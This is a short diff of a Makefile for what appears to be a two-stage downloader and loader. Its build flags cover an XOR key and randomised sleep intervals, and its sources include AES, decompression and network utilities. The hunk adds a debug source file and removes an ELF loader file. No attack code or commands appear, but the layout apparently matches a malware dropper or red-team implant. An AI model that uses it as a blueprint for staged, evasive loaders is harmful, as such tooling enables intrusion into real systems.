@@ -51,8 +51,8 @@ COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
 COMMON_CFLAGS += -DSLEEP_MIN=$(SLEEP_MIN)
 COMMON_CFLAGS += -DSLEEP_MAX=$(SLEEP_MAX)
 
-STAGE0_SRCS = downloader.c net_utils.c utils_min.c
-STAGE1_SRCS = stub.c elf_loader.c aes.c tinflate.c utils.c
+STAGE0_SRCS = downloader.c net_utils.c utils_min.c debug.c
+STAGE1_SRCS = stub.c aes.c tinflate.c utils.c debug.c
 
 STAGE0_TARGET = stager
 STAGE1_TARGET = loader
